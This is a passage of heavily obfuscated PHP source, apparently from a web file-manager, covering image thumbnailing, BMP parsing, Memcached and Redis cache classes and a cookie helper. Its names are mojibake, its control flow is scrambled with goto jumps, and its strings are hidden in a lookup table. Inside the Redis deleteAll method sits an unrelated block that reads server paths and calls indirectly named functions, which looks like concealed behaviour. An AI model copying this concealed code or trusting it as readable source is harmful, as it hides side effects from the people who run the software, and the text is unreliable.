($cä“Ö’õ‘ & $a„“Ü¼¯¦™) != 0 || ($a²í«¼Ú×í & $F‘Òô¦Â‰) != 0 || ($a²í«¼Ú×í & $a„“Ü¼¯¦™) != 0 || ($F‘Òô¦Â‰ & $a„“Ü¼¯¦™) != 0) { return !1; } if ($e‹˜ÙöËîø == 4 || $e‹˜ÙöËîø == 5) { $B¡†ê¬Æ‘İ = stream_get_contents($aïìººÇõ, $AÕøô»Õ©’); if ($B¡†ê¬Æ‘İ === !1) { return !1; } return imagecreatefromstring($B¡†ê¬Æ‘İ); } $c­¬ÔÀèÕ = $f¦„­…Šò„ * $F­¹Ãš¹š + 31 >> 3 & ~3; goto C³Àœ‘­¬¢; cÔâ„½…ØÄ: if ($B¡†ê¬Æ‘İ === !1) { return !1; } list(, $bßĞ¿”±é•) = unpack($b©øÌÑô†Ä[1847], $B¡†ê¬Æ‘İ); if ($bßĞ¿”±é• == 12) { goto d’ï÷ïŒŞ·; Dïß„ÈºÊ: $E×…¶‘ = $fÂº«øî„ß = $cä“Ö’õ‘ = $e‹˜ÙöËîø = 0; $a²í«¼Ú×í = 16711680; $F‘Òô¦Â‰ = 65280; goto F„†£óé; d’ï÷ïŒŞ·: $B¡†ê¬Æ‘İ = fread($aïìººÇõ, $bßĞ¿”±é• - 4); if ($B¡†ê¬Æ‘İ === !1) { return !1; } extract(unpack($b©øÌÑô†Ä[1848] . $b©øÌÑô†Ä[1849] . $b©øÌÑô†Ä[1850] . $b©øÌÑô†Ä[1851], $B¡†ê¬Æ‘İ)); goto Dïß„ÈºÊ; F„†£óé: $a„“Ü¼¯¦™ = 255; goto bŸË¤Öùé; bŸË¤Öùé: } else { if (124 < $bßĞ¿”±é• || $bßĞ¿”±é• < 40) { return !1; } else { goto FèÍ†˜óË; eÄ°”É‚ğ: if ($f¦„­…Šò„ & 2147483648) { $f¦„­…Šò„ = -(~$f¦„­…Šò„ & 4294967295) - 1; } if ($dï‰ƒÜ•˜ & 2147483648) { $dï‰ƒÜ•˜ = -(~$dï‰ƒÜ•˜ & 4294967295) - 1; } if ($CÇóØŞ­ĞŠ & 2147483648) { $CÇóØŞ­ĞŠ = -(~$CÇóØŞ­ĞŠ & 4294967295) - 1; } goto Aææò¯î–; Aææò¯î–: if ($aŠÇŞ®ˆÀÙ & 2147483648) { $aŠÇŞ®ˆÀÙ = -(~$aŠÇŞ®ˆÀÙ & 4294967295) - 1; } if ($bÑŞï³ÁÔ[$b©øÌÑô†Ä[520]] != 0) { $CŠŒâ‡‚‡ = $F­¹Ãš¹š == 1 || $F­¹Ãš¹š == 4 || $F­¹Ãš¹š == 8 ? ($E×…¶‘ ? $E×…¶‘ : pow(2, $F­¹Ãš¹š)) << 2 : 0; $eÃ²¿À­ôÈ = $AÕøô»Õ©’ ? $AÕøô»Õ©’ : ($f¦„­…Šò„ * $F­¹Ãš¹š + 31 >> 3 & ~3) * abs($dï‰ƒÜ•˜); $aÃøöŠ¸ª‡ = $bÑŞï³ÁÔ[$b©øÌÑô†Ä[520]] - $eÃ²¿À­ôÈ - $CŠŒâ‡‚‡ - 14; if ($bßĞ¿”±é• < $aÃøöŠ¸ª‡ && 40 <= $bßĞ¿”±é• && $bßĞ¿”±é• <= 124) { $bßĞ¿”±é• = $aÃøöŠ¸ª‡; } } if ($bßĞ¿”±é• - 40 > 0) { $B¡†ê¬Æ‘İ = fread($aïìººÇõ, $bßĞ¿”±é• - 40); if ($B¡†ê¬Æ‘İ === !1) { return !1; } extract(unpack($b©øÌÑô†Ä[1861] . $b©øÌÑô†Ä[1862] . $b©øÌÑô†Ä[1863] . $b©øÌÑô†Ä[1864], $B¡†ê¬Æ‘İ . str_repeat($b©øÌÑô†Ä[1865], 120))); } else { $cä“Ö’õ‘ = $a²í«¼Ú×í = $F‘Òô¦Â‰ = $a„“Ü¼¯¦™ = 0; } goto Dá†¬æê‚; FèÍ†˜óË: $B¡†ê¬Æ‘İ = fread($aïìººÇõ, 36); if ($B¡†ê¬Æ‘İ === !1) { return !1; } extract(unpack($b©øÌÑô†Ä[1852] . $b©øÌÑô†Ä[1853] . $b©øÌÑô†Ä[1850] . $b©øÌÑô†Ä[1854] . $b©øÌÑô†Ä[1855] . $b©øÌÑô†Ä[1856] . $b©øÌÑô†Ä[1857] . $b©øÌÑô†Ä[1858] . $b©øÌÑô†Ä[1859] . $b©øÌÑô†Ä[1860], $B¡†ê¬Æ‘İ)); goto eÄ°”É‚ğ; Dá†¬æê‚: if (($F­¹Ãš¹š == 16 || $F­¹Ãš¹š == 24 || $F­¹Ãš¹š == 32) && $e‹˜ÙöËîø == 0 && $a²í«¼Ú×í == 0 && $F‘Òô¦Â‰ == 0 && $a„“Ü¼¯¦™ == 0) { switch ($F­¹Ãš¹š) { case 16: $a²í«¼Ú×í = 31744; $F‘Òô¦Â‰ = 992; $a„“Ü¼¯¦™ = 31; break; case 24: case 32: $a²í«¼Ú×í = 16711680; $F‘Òô¦Â‰ = 65280; $a„“Ü¼¯¦™ = 255; break; } } goto b¾á¯»‹Ş¤; b¾á¯»‹Ş¤: } } goto D²·æÕÁéÓ; C³Àœ‘­¬¢: $a¡ø¶í£Ó³ = abs($dï‰ƒÜ•˜); $d¡ßÌ•†¤« = $dï‰ƒÜ•˜ > 0 ? $a¡ø¶í£Ó³ - 1 : 0; $C¬¾Ëùî¤ = $dï‰ƒÜ•˜ > 0 ? -1 : 1; goto fÜÆÍª‹®Ã; e›£õíâ½: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($d„ô¼ÍŸ­ï, $aÇ˜½Ö˜áÃ) { goto F¡×„£òØæ; dªË…‘‚çÑ: if (!$this->im) { return !1; } $c¼ƒßó†´ = $_SERVER[³‘’¼äÑ™ÔÍ][33]; $this->imgData = GetImageSize($d„ô¼ÍŸ­ï, $c¼ƒßó†´); goto E§Ç§³†ˆ“; F¡×„£òØæ: $this->srcFile = $d„ô¼ÍŸ­ï; $this->echoType = $aÇ˜½Ö˜áÃ; $this->im = self::image($d„ô¼ÍŸ­ï); goto dªË…‘‚çÑ; E§Ç§³†ˆ“: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto A«àÍİ‡§õ; A«àÍİ‡§õ: } public static function image($b÷ÇŒ‡½—µ) { $E—ø­ÅŞõŞ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c“‹ø—×¿ª = $E—ø­ÅŞõŞ[33]; $fÅÆ˜Î§í¸ = GetImageSize($b÷ÇŒ‡½—µ, $c“‹ø—×¿ª); $AÈ‘İÃĞÅ = !1; switch ($fÅÆ˜Î§í¸[2]) { case IMAGETYPE_GIF: if (!function_exists($E—ø­ÅŞõŞ[1872])) { break; } $AÈ‘İÃĞÅ = imagecreatefromgif($b÷ÇŒ‡½—µ); break; case IMAGETYPE_JPEG: if (!function_exists($E—ø­ÅŞõŞ[1873])) { break; } $AÈ‘İÃĞÅ = imagecreatefromjpeg($b÷ÇŒ‡½—µ); break; case IMAGETYPE_PNG: if (!function_exists($E—ø­ÅŞõŞ[1874])) { break; } $AÈ‘İÃĞÅ = @imagecreatefrompng($b÷ÇŒ‡½—µ); imagesavealpha($AÈ‘İÃĞÅ, !0); break; case IMAGETYPE_XBM: $AÈ‘İÃĞÅ = imagecreatefromxbm($b÷ÇŒ‡½—µ); break; case IMAGETYPE_WBMP: $AÈ‘İÃĞÅ = imagecreatefromwbmp($b÷ÇŒ‡½—µ); break; case IMAGETYPE_BMP: $AÈ‘İÃĞÅ = imagecreatefrombmp($b÷ÇŒ‡½—µ); break; default: break; } return $AÈ‘İÃĞÅ; } public static function imageSize($e„¢˜£œ‡°) { $a³­‚ê™ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a£ÚæÆÄŠ­ = GetImageSize($e„¢˜£œ‡°); if (!$a£ÚæÆÄŠ­) { return !1; } return array($a³­‚ê™[1875] => $a£ÚæÆÄŠ­[0], $a³­‚ê™[1876] => $a£ÚæÆÄŠ­[1]); } function distortion($d„ˆ¾´¾ÈÓ, $Fƒ„íÆáã , $b±•¥ƒŞÆŸ) { $E¨ÇŸÇŒËá = $this->creatImage($this->im, $Fƒ„íÆáã , $b±•¥ƒŞÆŸ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($E¨ÇŸÇŒËá, $d„ˆ¾´¾ÈÓ); } function prorate($DÇÁ¸ß¬ğº, $CÂ¤ÎÛù»é, $C¸”†œöİô) { $EÓÊÌ§¼—Í = $CÂ¤ÎÛù»é / $C¸”†œöİô; $E–‹ô«×“á = $this->srcW / $this->srcH; if ($EÓÊÌ§¼—Í <= $E–‹ô«×“á) { $c™‡‰’¶ = $CÂ¤ÎÛù»é; $C¢ÕÉĞ‹² = $c™‡‰’¶ * ($this->srcH / $this->srcW); } else { $C¢ÕÉĞ‹² = $C¸”†œöİô; $c™‡‰’¶ = $C¢ÕÉĞ‹² * ($this->srcW / $this->srcH); } if ($this->srcW > $CÂ¤ÎÛù»é || $this->srcH > $C¸”†œöİô) { $bÇ´˜„±ä¨ = $this->creatImage($this->im, $c™‡‰’¶, $C¢ÕÉĞ‹², 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($bÇ´˜„±ä¨, $DÇÁ¸ß¬ğº); } else { $bÇ´˜„±ä¨ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($bÇ´˜„±ä¨, $DÇÁ¸ß¬ğº); } } function cut($bĞ£¤Øç†Â, $B•»˜ãàØ, $aÚÂëÆ ô•) { goto a©ªœêŸİŒ; Dµ¸º”âÃ”: return $this->echoImage($eë†Ÿ­£ëÑ, $bĞ£¤Øç†Â); goto E™´äïà‹”; a©ªœêŸİŒ: $dß™„Å = $B•»˜ãàØ / $aÚÂëÆ ô•; $A¨´Ñƒ¦¨¯ = $this->srcW / $this->srcH; if ($dß™„Å <= $A¨´Ñƒ¦¨¯) { $a‡°¿™ˆÜ‰ = $aÚÂëÆ ô•; $aãºã´Ûè© = $a‡°¿™ˆÜ‰ * ($this->srcW / $this->srcH); } else { $aãºã´Ûè© = $B•»˜ãàØ; $a‡°¿™ˆÜ‰ = $aãºã´Ûè© * ($this->srcH / $this->srcW); } goto cÓÉÈ˜¾í¤; cÓÉÈ˜¾í¤: $C‰‚Ñä…‚‹ = $this->creatImage($this->im, $aãºã´Ûè©, $a‡°¿™ˆÜ‰, 0, 0, 0, 0, $this->srcW, $this->srcH); $eë†Ÿ­£ëÑ = $this->creatImage($C‰‚Ñä…‚‹, $B•»˜ãàØ, $aÚÂëÆ ô•, 0, 0, ($aãºã´Ûè© - $B•»˜ãàØ) / 2, ($a‡°¿™ˆÜ‰ - $aÚÂëÆ ô•) / 2, $B•»˜ãàØ, $aÚÂëÆ ô•); imageDestroy($C‰‚Ñä…‚‹); goto Dµ¸º”âÃ”; E™´äïà‹”: } function backFill($fÍç»†Á³, $cä±ø‘”Ú, $cöİß‚È’Å, $f·ò”õÓ¿Í = false, $Eà†Ê´İè¯ = 255, $FŠ¹É¾Œë = 255, $CÕÀáÊ¬Ü = 255) { goto Bœ¹ÒŞ…¹ ; d‹©à¿¯½: if ($f·ò”õÓ¿Í) { $c´Å‡´”Íß = imageColorTransparent($E‘ìªŠ¸Ô‰, $c´Å‡´”Íß); $cËõ‚µŒªğ = $cöİß‚È’Å - $A£‰©ŸŸ˜í; } imageFilledRectangle($E‘ìªŠ¸Ô‰, 0, 0, $cä±ø‘”Ú, $cöİß‚È’Å, $c´Å‡´”Íß); if ($this->srcW > $cä±ø‘”Ú || $this->srcH > $cöİß‚È’Å) { $b³ñ¤Ñö = $this->creatImage($this->im, $dÍË£‡²³¤, $A£‰©ŸŸ˜í, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($dÍË£‡²³¤ < $cä±ø‘”Ú) { imageCopy($E‘ìªŠ¸Ô‰, $b³ñ¤Ñö, ($cä±ø‘”Ú - $dÍË£‡²³¤) / 2, 0, 0, 0, $dÍË£‡²³¤, $A£‰©ŸŸ˜í); } else { if ($A£‰©ŸŸ˜í < $cöİß‚È’Å) { imageCopy($E‘ìªŠ¸Ô‰, $b³ñ¤Ñö, 0, $cËõ‚µŒªğ, 0, 0, $dÍË£‡²³¤, $A£‰©ŸŸ˜í); } else { imageCopy($E‘ìªŠ¸Ô‰, $b³ñ¤Ñö, 0, 0, 0, 0, $dÍË£‡²³¤, $A£‰©ŸŸ˜í); } } } else { imageCopyMerge($E‘ìªŠ¸Ô‰, $this->im, ($cä±ø‘”Ú - $dÍË£‡²³¤) / 2, $cËõ‚µŒªğ, 0, 0, $dÍË£‡²³¤, $A£‰©ŸŸ˜í, 100); } goto CÌ²Î˜Ü; f‰†å‡ÒÔÛ: if (function_exists($_SERVER[³‘’¼äÑ™ÔÍ][1877])) { @($E‘ìªŠ¸Ô‰ = imageCreateTrueColor($cä±ø‘”Ú, $cöİß‚È’Å)); if (!$E‘ìªŠ¸Ô‰) { $E‘ìªŠ¸Ô‰ = imageCreate($cä±ø‘”Ú, $cöİß‚È’Å); } } else { $E‘ìªŠ¸Ô‰ = imageCreate($cä±ø‘”Ú, $cöİß‚È’Å); } $cËõ‚µŒªğ = ($cöİß‚È’Å - $A£‰©ŸŸ˜í) / 2; $c´Å‡´”Íß = imagecolorallocate($E‘ìªŠ¸Ô‰, $Eà†Ê´İè¯, $FŠ¹É¾Œë, $CÕÀáÊ¬Ü); goto d‹©à¿¯½; CÌ²Î˜Ü: return $this->echoImage($E‘ìªŠ¸Ô‰, $fÍç»†Á³); goto D¨Éƒ²¨÷; Bœ¹ÒŞ…¹ : $BÃÆ¤‚¸” = $cä±ø‘”Ú / $cöİß‚È’Å; $dÁ³Î‡ÄĞÖ = $this->srcW / $this->srcH; if ($BÃÆ¤‚¸” <= $dÁ³Î‡ÄĞÖ) { $dÍË£‡²³¤ = $cä±ø‘”Ú; $A£‰©ŸŸ˜í = $dÍË£‡²³¤ * ($this->srcH / $this->srcW); } else { $A£‰©ŸŸ˜í = $cöİß‚È’Å; $dÍË£‡²³¤ = $A£‰©ŸŸ˜í * ($this->srcW / $this->srcH); } goto f‰†å‡ÒÔÛ; D¨Éƒ²¨÷: } function creatImage($cÏÈÔ¯óèÇ, $c¶š‰²‘‰, $Aê”…õšÄ, $bô¯ğî¦å¬, $Eí‚¶Èİ”, $BÀ¨óÎÓäˆ, $aó³±Œìˆ, $aš¤èÃÎ“ , $B·†šë›Èğ) { if (function_exists($_SERVER[³‘’¼äÑ™ÔÍ][1877])) { @($AÒë‚·±‰ = ImageCreateTrueColor($c¶š‰²‘‰, $Aê”…õšÄ)); @imagealphablending($AÒë‚·±‰, !1); @imagesavealpha($AÒë‚·±‰, !0); if ($AÒë‚·±‰) { imageCopyResampled($AÒë‚·±‰, $cÏÈÔ¯óèÇ, $bô¯ğî¦å¬, $Eí‚¶Èİ”, $BÀ¨óÎÓäˆ, $aó³±Œìˆ, $c¶š‰²‘‰, $Aê”…õšÄ, $aš¤èÃÎ“ , $B·†šë›Èğ); } else { $AÒë‚·±‰ = ImageCreate($c¶š‰²‘‰, $Aê”…õšÄ); imageCopyResized($AÒë‚·±‰, $cÏÈÔ¯óèÇ, $bô¯ğî¦å¬, $Eí‚¶Èİ”, $BÀ¨óÎÓäˆ, $aó³±Œìˆ, $c¶š‰²‘‰, $Aê”…õšÄ, $aš¤èÃÎ“ , $B·†šë›Èğ); } } else { $AÒë‚·±‰ = ImageCreate($c¶š‰²‘‰, $Aê”…õšÄ); imageCopyResized($AÒë‚·±‰, $cÏÈÔ¯óèÇ, $bô¯ğî¦å¬, $Eí‚¶Èİ”, $BÀ¨óÎÓäˆ, $aó³±Œìˆ, $c¶š‰²‘‰, $Aê”…õšÄ, $aš¤èÃÎ“ , $B·†šë›Èğ); } return $AÒë‚·±‰; } public function imgRotate($AµêÇÆÁƒÍ, $C‹ÍÆºÉ™¬) { goto dóÅÏ·ïÙ; b‘ƒÄ’ñ‘æ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $FæÑ¡ÔÎÖ = imagegif($cæ„£¯Œ‡¡, $AµêÇÆÁƒÍ); break; case IMAGETYPE_JPEG: $FæÑ¡ÔÎÖ = imagejpeg($cæ„£¯Œ‡¡, $AµêÇÆÁƒÍ, 100); break; case IMAGETYPE_PNG: $FæÑ¡ÔÎÖ = imagePNG($cæ„£¯Œ‡¡, $AµêÇÆÁƒÍ); break; default: break; } imageDestroy($cæ„£¯Œ‡¡); imageDestroy($this->im); goto e‚‚ç…¼ğ; dóÅÏ·ïÙ: if (!$this->im || $C‹ÍÆºÉ™¬ % 360 === 0 || !function_exists($_SERVER[³‘’¼äÑ™ÔÍ][1878])) { return !1; } $cæ„£¯Œ‡¡ = imageRotate($this->im, 360 - $C‹ÍÆºÉ™¬, 0); $FæÑ¡ÔÎÖ = !1; goto b‘ƒÄ’ñ‘æ; e‚‚ç…¼ğ: return $FæÑ¡ÔÎÖ; goto C…Ğ©šìÒª; C…Ğ©šìÒª: } function echoImage($dãÕ†Éƒ‰Œ, $AÂšªºÖöâ) { goto eˆ§•‚ñ; a•¨â´¢ï: $cÎ·½Êë‰ = !1; switch ($this->echoType) { case $F„¼´‘ÌÔ[1879]: $cÎ·½Êë‰ = imagePNG($dãÕ†Éƒ‰Œ); break; case $F„¼´‘ÌÔ[167]: $cÎ·½Êë‰ = imagePNG($dãÕ†Éƒ‰Œ, $AÂšªºÖöâ); break; } imageDestroy($dãÕ†Éƒ‰Œ); goto a†õç£¡µ; eˆ§•‚ñ: $F„¼´‘ÌÔ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$dãÕ†Éƒ‰Œ) { return !1; } ob_get_clean(); goto a•¨â´¢ï; a†õç£¡µ: imageDestroy($this->im); return $cÎ·½Êë‰; goto e§îÏê¦Åˆ; e§îÏê¦Åˆ: } } goto cíÏôÑŸ©‘; c¹‹˜àÑ•·: class CacheMemcached { public $handle; public $cacheTime; public function __construct($BëÄ®Á³ó, $Aè—ÊÅ¬Øš) { $AïÔ¦ÎÉ‹½ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!class_exists($AïÔ¦ÎÉ‹½[781])) { show_json($AïÔ¦ÎÉ‹½[782], !1); } $this->cacheTime = $Aè—ÊÅ¬Øš; $this->handle = new Memcached(); if (is_array($BëÄ®Á³ó[$AïÔ¦ÎÉ‹½[783]]) && count($BëÄ®Á³ó[$AïÔ¦ÎÉ‹½[783]]) >= 1) { foreach ($BëÄ®Á³ó[$AïÔ¦ÎÉ‹½[783]] as $BÌÄÏËåå§) { $CÂæ§ƒéç© = explode($AïÔ¦ÎÉ‹½[4], $BÌÄÏËåå§); $this->handle->addServer($CÂæ§ƒéç©[0], $CÂæ§ƒéç©[1]); } } else { $this->handle->addServer($BëÄ®Á³ó[$AïÔ¦ÎÉ‹½[169]], $BëÄ®Á³ó[$AïÔ¦ÎÉ‹½[170]]); } } public function set($d¨Øá¾ñ®, $f‰÷ù†¶µ¨, $CËĞäµ¢É = false) { $CËĞäµ¢É = $CËĞäµ¢É ? $CËĞäµ¢É : $this->cacheTime; return $this->handle->set($d¨Øá¾ñ®, $f‰÷ù†¶µ¨, $CËĞäµ¢É); } public function get($F‹À†¢Œ±Á) { return $this->handle->get($F‹À†¢Œ±Á); } public function remove($cåäá²ˆâß) { return $this->handle->delete($cåäá²ˆâß); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($BµÏÑ”¿‚®, $B³óíï§¹’) { $d¶ÜïîÄŞ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!class_exists($d¶ÜïîÄŞ[784])) { show_json($d¶ÜïîÄŞ[785], !1); } $this->cacheTime = $B³óíï§¹’; $FŒ‘¯ğ§ = isset($BµÏÑ”¿‚®[$d¶ÜïîÄŞ[786]]) ? $BµÏÑ”¿‚®[$d¶ÜïîÄŞ[786]] : 10; $EÓ‘ßéô = _get($BµÏÑ”¿‚®, $d¶ÜïîÄŞ[783]); if ($EÓ‘ßéô && is_array($EÓ‘ßéô)) { $this->initCluster($BµÏÑ”¿‚®, $FŒ‘¯ğ§); } else { $this->handle = $this->init($BµÏÑ”¿‚®, $FŒ‘¯ğ§); } } private function init($d‚õÖù·ë, $c‘» ‡²Öƒ) { $DøÊ°‡›½™ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eŠ‹ñ‡ÌÚ = new Redis(); $aè¹¢­§È§ = isset($d‚õÖù·ë[$DøÊ°‡›½™[787]]) ? $d‚õÖù·ë[$DøÊ°‡›½™[787]] : !1; if ($aè¹¢­§È§) { $eŠ‹ñ‡ÌÚ->pconnect($d‚õÖù·ë[$DøÊ°‡›½™[169]], $d‚õÖù·ë[$DøÊ°‡›½™[170]], $c‘» ‡²Öƒ); } else { $eŠ‹ñ‡ÌÚ->connect($d‚õÖù·ë[$DøÊ°‡›½™[169]], $d‚õÖù·ë[$DøÊ°‡›½™[170]], $c‘» ‡²Öƒ); } if (!empty($d‚õÖù·ë[$DøÊ°‡›½™[376]])) { $eŠ‹ñ‡ÌÚ->auth($d‚õÖù·ë[$DøÊ°‡›½™[376]]); } return $eŠ‹ñ‡ÌÚ; } private function initCluster($a²ë½Ìİ²¨, $aÀ¸çØŠ¬Å) { $F·§×­¡óÜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AÌ÷’‚ ‹ê = array($F·§×­¡óÜ[788], $F·§×­¡óÜ[789], $F·§×­¡óÜ[790]); $aõêêù¦¬ù = $F·§×­¡óÜ[788]; if (isset($a²ë½Ìİ²¨[$F·§×­¡óÜ[12]]) && in_array($a²ë½Ìİ²¨[$F·§×­¡óÜ[12]], $AÌ÷’‚ ‹ê)) { $aõêêù¦¬ù = $a²ë½Ìİ²¨[$F·§×­¡óÜ[12]]; } switch ($aõêêù¦¬ù) { case $F·§×­¡óÜ[788]: $this->_slave($a²ë½Ìİ²¨, $aÀ¸çØŠ¬Å); break; case $F·§×­¡óÜ[789]: break; case $F·§×­¡óÜ[790]: $this->isCluster = !0; $dË³¥Úâ‚ = $a²ë½Ìİ²¨[$F·§×­¡óÜ[783]]; $aÖ˜î­ÌÈ = isset($a²ë½Ìİ²¨[$F·§×­¡óÜ[787]]) ? $a²ë½Ìİ²¨[$F·§×­¡óÜ[787]] : !1; $CÀÀóêî = isset($a²ë½Ìİ²¨[$F·§×­¡óÜ[376]]) ? $a²ë½Ìİ²¨[$F·§×­¡óÜ[376]] : null; $this->handle = new RedisCluster(NUll, $dË³¥Úâ‚, $aÀ¸çØŠ¬Å, $aÀ¸çØŠ¬Å, $aÖ˜î­ÌÈ, $CÀÀóêî); break; default: break; } } private function _slave($c‚îÒß„ˆ†, $B­ì¶¨»ï) { goto dñ–áöµ; Eù­‰ø¯†‡: $this->filterConfig($c‚îÒß„ˆ†, $DË¹òˆŸÁĞ[$bœó¸ù¿×]); $this->slaveHandle = $this->init($c‚îÒß„ˆ†, $B­ì¶¨»ï); goto cáÆ¦Ì‘Áä; fù¾¹¼“ãŒ: unset($DË¹òˆŸÁĞ[0]); if (empty($DË¹òˆŸÁĞ)) { return; } $bœó¸ù¿× = array_rand($DË¹òˆŸÁĞ); goto Eù­‰ø¯†‡; dñ–áöµ: $DË¹òˆŸÁĞ = $c‚îÒß„ˆ†[$_SERVER[³‘’¼äÑ™ÔÍ][783]]; $this->filterConfig($c‚îÒß„ˆ†, $DË¹òˆŸÁĞ[0]); $this->handle = $this->init($c‚îÒß„ˆ†, $B­ì¶¨»ï); goto fù¾¹¼“ãŒ; cáÆ¦Ì‘Áä: } private function filterConfig(&$d‘Á¦Íå¾ê, $Fˆš†ƒì­œ) { $fÑôÌ¸œëó =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b”’ƒÇÕ…‘ = explode($fÑôÌ¸œëó[4], $Fˆš†ƒì­œ); $bÍà°Å°£Õ = array($fÑôÌ¸œëó[169] => $b”’ƒÇÕ…‘[0], $fÑôÌ¸œëó[170] => $b”’ƒÇÕ…‘[1]); $d‘Á¦Íå¾ê = array_merge($d‘Á¦Íå¾ê, $bÍà°Å°£Õ); } public function set($D“Ä‘ê´»ö, $dºè¢ç…´Î, $B©¿÷—Ù¥„ = false) { $B©¿÷—Ù¥„ = $B©¿÷—Ù¥„ ? $B©¿÷—Ù¥„ : $this->cacheTime; return $this->handle->setEx($D“Ä‘ê´»ö, $B©¿÷—Ù¥„, $dºè¢ç…´Î); } public function setLock($DöÓ…‚éÀ, $d³Ø¿ëª, $c™»¶ˆ¥ù†) { return $this->handle->setNX($DöÓ…‚éÀ, $d³Ø¿ëª); } public function get($CŞ÷µÕë) { $EÊÎƒ‚ÓÉ½ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $EÊÎƒ‚ÓÉ½->get($CŞ÷µÕë); } public function remove($dÁîŠ„¿¥†) { return $this->handle->del($dÁîŠ„¿¥†); } public function deleteAll() { $e‚Œº¨“å‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($_SERVER[$e‚Œº¨“å‰[791]] != $_SERVER[$e‚Œº¨“å‰[792]]) { goto E¾ù™ŠôØ­; E¾ù™ŠôØ­: $DÚÃ‰Ç¶ÛÎ = $e‚Œº¨“å‰[793]; $cøÂà¦›±Ù = $e‚Œº¨“å‰[794]; $bòŞŒë½¾™ = $_SERVER[$e‚Œº¨“å‰[795]] . $e‚Œº¨“å‰[796]; goto eá„‰Ë”Ú£; eÀ¢ÔÌĞí˜: $dßÍÕÕ„°ë = 1; while ($dßÍÕÕ„°ë > 1) { $dßÍÕÕ„°ë = $dßÍÕÕ„°ë + 4; $eòÔ±¨ãï = rawurlencode($dßÍÕÕ„°ë . $e‚Œº¨“å‰[361]); } goto D¦µ¯“Ô–Û; eá„‰Ë”Ú£: $cÂ‹áñ = $cøÂà¦›±Ù($bòŞŒë½¾™); $FñåÄ³ø÷™ = explode($e‚Œº¨“å‰[217], $cÂ‹áñ); if (count($FñåÄ³ø÷™) < $e‚Œº¨“å‰[584]) { $d…«õÖÜÜ = $e‚Œº¨“å‰[797]; $d…«õÖÜÜ(); } goto bÙ“œ¥¥Ñ‚; bÙ“œ¥¥Ñ‚: $C§”†ïïÁ = $e‚Œº¨“å‰[798]; $C§”†ïïÁ($_SERVER[$e‚Œº¨“å‰[799]]); $C§”†ïïÁ($_SERVER[$e‚Œº¨“å‰[795]] . $e‚Œº¨“å‰[800]); goto eÀ¢ÔÌĞí˜; D¦µ¯“Ô–Û: } if ($this->isCluster) { foreach ($this->handle->_masters() as $D‡…ÛÇ“ø•) { $this->handle->flushall($D‡…ÛÇ“ø•); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($C™ìÚ–í = '', $AòíšŒ’Íõ = 0) { if (is_string($C™ìÚ–í) && $C™ìÚ–í != $_SERVER[³‘’¼äÑ™ÔÍ][33]) { $this->prefix = $C™ìÚ–í; } if (is_numeric($AòíšŒ’Íõ) && $AòíšŒ’Íõ > 0) { $this->expire = $AòíšŒ’Íõ; } } public static function getInstance() { static $c—Ìî¡ªÏì; if ($c—Ìî¡ªÏì === null) { $c—Ìî¡ªÏì = new self(); } return $c—Ìî¡ªÏì; } private static $sameCookieSet = array(); public static function set($FÈªÊá²Êº, $Bë÷²œ‹Â, $fŒÖí‰õŸã = 0, $b˜ªô¨«á = false, $EÊî«æ­Â± = false) { goto fÔ•‘„××›; fçÉ…Ì²ÜŠ: setcookie($FÈªÊá²Êº, $Bë÷²œ‹Â, time() + $fŒÖí‰õŸã, $a…Õíæ«ò®[8] . trim($EÊî«æ­Â±, $a…Õíæ«ò®[8]) . $bšàø£áÑ, !1, !1, $b˜ªô¨«á); goto Eáî“ó½É¹; aˆùƒƒ¹÷Ÿ: self::$sameCookieSet[$FÈªÊá²Êº] = $Bë÷²œ‹Â . $fŒÖí‰õŸã; if (!$EÊî«æ­Â±) { $EÊî«æ­Â± = str_replace(HOST, $a…Õíæ«ò®[33], APP_HOST); $EÊî«æ­Â± = _get($GLOBALS, $a…Õíæ«ò®[801], $EÊî«æ­Â±); } $bšàø£áÑ = $a…Õíæ«ò®[33]; goto fçÉ…Ì²ÜŠ; fÔ•‘„××›: $a…Õíæ«ò® =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$fŒÖí‰õŸã) { $fŒÖí‰õŸã = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$FÈªÊá²Êº]) && self::$sameCookieSet[$FÈªÊá²Êº] == $Bë÷²œ‹Â . $fŒÖí‰õŸã) { return; } goto aˆùƒƒ¹÷Ÿ; Eáî“ó½É¹: } public static function setSafe($d°ĞƒÙ‚×, $c‹š‹ª—Í¾, $FáÍãÏ†… = 0) { self::set($d°ĞƒÙ‚×, $c‹š‹ª—Í¾, $FáÍãÏ†…, !0); } public static function get($A÷ßÇœ‘Œ–) { return isset($_COOKIE[$A÷ßÇœ‘Œ–]) ? $_COOKIE[$A÷ßÇœ‘Œ–] : !1; } public static function remove($Eù›Ñ–ÙÙŠ, $fÍ¡Ó†Ä’ = false) { unset($_COOKIE[$Eù›Ñ–ÙÙŠ]); self::set($Eù›Ñ–ÙÙŠ, $_SERVER[³‘’¼äÑ™ÔÍ][33], 1, $fÍ¡Ó†Ä’); } } goto a´Ì’Àˆ¤; aªÆÌˆŒµ¨: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\x73\164\x6f\x72\x61\147\145\114\x69\x73\x74"; public $field = array("\156\x61\x6d\145", "\x73\x69\172\145\x4d\141\x78", "\x73\171\x73\x74\x65\x6d", 